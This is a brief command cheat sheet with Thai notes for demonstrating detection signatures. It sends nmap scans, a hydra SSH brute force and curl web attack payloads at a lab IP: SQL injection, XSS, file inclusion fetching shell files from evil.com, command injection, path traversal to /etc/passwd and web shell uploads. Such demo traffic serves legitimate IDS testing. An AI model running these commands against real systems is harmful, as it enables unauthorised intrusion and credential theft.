# Scan Signature demo
```bash
sudo apt install nmap
```
```bash
nmap [subnet]
```
```bash
nmap -p 22,80,443 [ip address]
```
```bash
sudo nmap -sS [ip address]
```
```bash
sudo nmap -sF [ip address]
```

# Brute force Signature demo

```bash
sudo apt install hydra
```
```bash
hydra -l [username] -P /path/to/passwords.txt ssh://[ip address]
```
## Exploit Signature demo 
- หากเป็น http ใช้คำสั่งตามด้านล่างได้เลย
- หากเป็น https ให้เปลี่ยนที่ตัวคำสั่งด้านล่างให้เป็น https ด้วย
- หากเป็น Self-signed cert  ให้เติม -k หลัง curl ด้วย

- SQL Injection (SQLi)
```bash
curl -X GET "http://10.147.18.208/login.php?user=admin'--&pass=123"
```
```bash
curl -X GET "http://10.147.18.208/search.php?q=1+union+select+null,null--"
```

- Cross-Site Scripting (XSS)
```bash
curl -G "http://10.147.18.208/page.php" --data-urlencode "name=<script>alert(1)</script>"
```
```bash
curl -G "http://10.147.18.208/page.php" --data-urlencode "img=<img src=x onerror=alert(1)>"
```
```bash
curl -G "http://10.147.18.208/page.php" --data-urlencode "param=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
```

- Local File Inclusion (LFI)
```bash
curl -G "http://10.147.18.208/index.php" --data-urlencode "file=../../etc/passwd"
```
```bash
curl -G "http://10.147.18.208/index.php" --data-urlencode "file=%252e%252e%252f%252e%252e%252fetc%252fpasswd"
```

- Remote File Inclusion (RFI)
```bash
curl -G "http://10.147.18.208/index.php" --data-urlencode "file=http://evil.com/malware.txt"
```
```bash
curl -G "http://10.147.18.208/index.php" --data-urlencode "file=ftp://evil.com/shell.txt"
```

- Command Injection
```bash
curl -G "http://10.147.18.208/ping.php" --data-urlencode "host=127.0.0.1; ls -la"
```
```bash
curl -G "http://10.147.18.208/ping.php" --data-urlencode "host=127.0.0.1`whoami`"
```
```bash
curl -G "http://10.147.18.208/ping.php" --data-urlencode "host=127.0.0.1$(id)"
```

- Directory Traversal
```bash
curl -G "http://10.147.18.208/download.php" --data-urlencode "file=../../../../etc/passwd"
```
```bash
curl -G "http://10.147.18.208/download.php" --data-urlencode "file=/proc/self/environ"
```


- Web Shell Upload
```bash
curl -X POST "http://10.147.18.208/upload.php" -F "file=@/tmp/malicious.php"
```
```bash
curl -X POST "http://10.147.18.208/upload.php" -F "file=@/tmp/shell.phtml"
```

## Server side prepare http
```bash
python3 -m http.server [port]
```